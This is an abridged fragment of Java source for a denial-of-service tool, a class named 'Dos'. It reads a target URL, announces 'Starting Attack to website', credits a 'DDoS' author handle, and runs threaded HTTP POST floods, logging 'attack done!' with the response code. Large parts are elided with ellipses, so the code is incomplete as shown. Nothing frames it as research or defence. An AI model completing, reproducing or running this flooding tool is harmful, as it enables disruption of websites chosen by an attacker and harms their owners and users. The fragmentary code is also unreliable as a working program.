...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Starting Attack to website: " + url);
        ...
        System.out.println("Setting DDoS By: Wh⁰⁰⁰⁴mmm");
        ...
        System.out.println("Starting Attack Website");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("attack done!: " + responseCode + "Thread: " + this.seq);
    }
